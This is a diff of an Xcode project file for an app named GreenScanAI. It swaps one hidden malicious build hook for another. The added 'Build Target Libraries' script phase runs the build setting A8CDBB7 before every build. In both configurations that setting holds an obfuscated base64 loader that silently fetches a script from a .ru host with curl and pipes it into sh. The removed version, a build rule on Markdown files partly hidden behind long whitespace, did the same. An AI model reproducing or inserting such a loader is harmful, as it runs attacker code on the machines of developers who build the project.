@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		95ED2A0D7E5049E7967BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 10905B37C9F445E6A67BBDC8; };
 		0F65C2EC2F21DB2800DEF840 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0F65C2E92F21DB2800DEF840 /* Assets.xcassets */; };
 		0F65C2ED2F21DB2800DEF840 /* GreenScanAIApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F65C2E72F21DB2800DEF840 /* GreenScanAIApp.swift */; };
 		0F65C2EE2F21DB2800DEF840 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F65C2EA2F21DB2800DEF840 /* ContentView.swift */; };
@@ -29,7 +28,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		10905B37C9F445E6A67BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0F65C2D82F21DB1100DEF840 /* GreenScanAI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = GreenScanAI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0F65C2E72F21DB2800DEF840 /* GreenScanAIApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GreenScanAIApp.swift; sourceTree = "<group>"; };
 		0F65C2E92F21DB2800DEF840 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -74,7 +72,6 @@
 		0F65C2D92F21DB1100DEF840 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				10905B37C9F445E6A67BBDC8 /* README.md */,
 				0F65C2D82F21DB1100DEF840 /* GreenScanAI.app */,
 			);
 			name = Products;
@@ -161,12 +158,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F65C2E32F21DB1300DEF840 /* Build configuration list for PBXNativeTarget "GreenScanAI" */;
 			buildPhases = (
+				F7FFC5E52E7A431CA57BBDC8 /* Build Target Libraries */,
 				0F65C2D42F21DB1100DEF840 /* Sources */,
 				0F65C2D52F21DB1100DEF840 /* Frameworks */,
 				0F65C2D62F21DB1100DEF840 /* Resources */,
 			);
 			buildRules = (
-				46813B4C8A7442809B7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -212,20 +209,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		46813B4C8A7442809B7BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -233,7 +216,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				95ED2A0D7E5049E7967BBDC8 /* README.md */,
 				0F65C3142F21DCF300DEF840 /* Config.xcconfig in Resources */,
 				0F65C2EC2F21DB2800DEF840 /* Assets.xcassets in Resources */,
 			);
@@ -242,6 +224,25 @@ sh -c \"${A8CDBB7}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		F7FFC5E52E7A431CA57BBDC8 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -275,7 +276,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 0F65C3132F21DCF300DEF840 /* Config.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -340,7 +341,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 0F65C3132F21DCF300DEF840 /* Config.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
